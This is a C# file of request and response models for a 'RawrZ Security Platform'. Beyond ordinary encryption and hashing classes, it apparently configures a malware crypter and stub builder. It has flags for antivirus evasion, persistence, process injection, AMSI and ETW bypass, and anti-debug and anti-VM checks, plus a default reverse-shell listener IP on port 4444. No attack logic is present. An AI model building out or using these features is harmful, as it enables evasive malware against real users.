using System.ComponentModel.DataAnnotations;

namespace RawrZSecurityPlatform.Models
{
    public class EncryptionRequest
    {
        [Required]
        public string Algorithm { get; set; } = "AES-256-GCM";
        
        [Required]
        public string Extension { get; set; } = ".enc";
        
        public int KeySize { get; set; } = 256;
        public string Mode { get; set; } = "GCM";
        public bool Compress { get; set; } = true;
        public bool Obfuscate { get; set; } = true;
        public bool Stealth { get; set; } = true;
        public int Iterations { get; set; } = 100000;
        
        // Advanced/Dangerous Features
        public bool Evasion { get; set; } = false;
        public bool Adr { get; set; } = false;
        public bool Upx { get; set; } = false;
        public bool Mutex { get; set; } = false;
        public bool Persistence { get; set; } = false;
        public bool Injection { get; set; } = false;
        public bool Network { get; set; } = false;
        public bool Privilege { get; set; } = false;
        public bool Sandbox { get; set; } = false;
        public bool Obfuscation { get; set; } = false;
        public bool Polymorphic { get; set; } = false;
        public bool Metamorphic { get; set; } = false;
        public bool HotPatching { get; set; } = false;
        
        // PowerShell Features
        public bool PsBypass { get; set; } = false;
        public bool PsObfuscation { get; set; } = false;
        public bool PsAmsi { get; set; } = false;
        public bool PsEtw { get; set; } = false;
        public bool PsLogging { get; set; } = false;
        public bool PsMemory { get; set; } = false;
        public bool PsReflection { get; set; } = false;
        public bool PsDotNet { get; set; } = false;
        
        // Payload Customization
        public string PayloadType { get; set; } = "generic";
        public string TargetOS { get; set; } = "windows";
        public string TargetArch { get; set; } = "x64";
        public string ListenerIP { get; set; } = "198.199.70.153";
        public int ListenerPort { get; set; } = 4444;
        public string CustomPayload { get; set; } = "";
    }

    public class EncryptionResponse
    {
        public bool Success { get; set; }
        public string Message { get; set; } = "";
        public string OriginalName { get; set; } = "";
        public string EncryptedName { get; set; } = "";
        public long OriginalSize { get; set; }
        public long EncryptedSize { get; set; }
        public string Algorithm { get; set; } = "";
        public string DownloadUrl { get; set; } = "";
        public string Error { get; set; } = "";
        public string Key { get; set; } = "";
        public string IV { get; set; } = "";
        public string Hash { get; set; } = "";
    }

    public class DecryptionRequest
    {
        [Required]
        public string Key { get; set; } = "";
        [Required]
        public string IV { get; set; } = "";
        public string Algorithm { get; set; } = "AES-256-GCM";
    }

    public class DecryptionResponse
    {
        public bool Success { get; set; }
        public string Message { get; set; } = "";
        public string OriginalName { get; set; } = "";
        public string DecryptedName { get; set; } = "";
        public long DecryptedSize { get; set; }
        public string DownloadUrl { get; set; } = "";
        public string Error { get; set; } = "";
    }

    public class HashRequest
    {
        public string Algorithm { get; set; } = "SHA256";
        public bool Save { get; set; } = false;
        public string Extension { get; set; } = ".hash";
    }

    public class HashResponse
    {
        public bool Success { get; set; }
        public string Hash { get; set; } = "";
        public string Algorithm { get; set; } = "";
        public string FileName { get; set; } = "";
        public string DownloadUrl { get; set; } = "";
        public string Error { get; set; } = "";
    }

    public class FileAnalysisRequest
    {
        public bool EntropyAnalysis { get; set; } = true;
        public bool MalwareScan { get; set; } = true;
        public bool IntegrityCheck { get; set; } = true;
    }

    public class FileAnalysisResponse
    {
        public bool Success { get; set; }
        public string FileName { get; set; } = "";
        public string FileType { get; set; } = "";
        public double Entropy { get; set; }
        public string Interpretation { get; set; } = "";
        public double Randomness { get; set; }
        public string RiskLevel { get; set; } = "";
        public string Status { get; set; } = "";
        public List<string> Threats { get; set; } = new();
        public string Checksum { get; set; } = "";
        public string Error { get; set; } = "";
    }

    public class StubGenerationRequest
    {
        [Required]
        public string Type { get; set; } = "exe";
        public string Architecture { get; set; } = "x64";
        public int Size { get; set; } = 50;
        public bool Obfuscation { get; set; } = false;
        public bool Packing { get; set; } = false;
        public bool AntiDebug { get; set; } = false;
        public bool AntiVM { get; set; } = false;
        public string Icon { get; set; } = "";
        public string Version { get; set; } = "1.0.0.0";
        public string Description { get; set; } = "RawrZ Security Application";
        public string Company { get; set; } = "RawrZ Security";
    }

    public class StubGenerationResponse
    {
        public bool Success { get; set; }
        public StubInfo Stub { get; set; } = new();
        public string DownloadUrl { get; set; } = "";
        public string Error { get; set; } = "";
    }

    public class StubInfo
    {
        public string Type { get; set; } = "";
        public string Architecture { get; set; } = "";
        public int Size { get; set; }
        public string Filename { get; set; } = "";
        public string Path { get; set; } = "";
    }

    public class KeyGenerationRequest
    {
        public int KeySize { get; set; } = 256;
        public string Algorithm { get; set; } = "AES-256-GCM";
    }

    public class KeyGenerationResponse
    {
        public bool Success { get; set; }
        public string KeyId { get; set; } = "";
        public string Algorithm { get; set; } = "";
        public string PublicKey { get; set; } = "";
        public string PrivateKey { get; set; } = "";
        public string Error { get; set; } = "";
    }

    public class KeyExportResponse
    {
        public bool Success { get; set; }
        public string DownloadUrl { get; set; } = "";
        public int KeyCount { get; set; }
        public string Error { get; set; } = "";
    }

    public class KeyImportResponse
    {
        public bool Success { get; set; }
        public int KeyCount { get; set; }
        public string Error { get; set; } = "";
    }
}
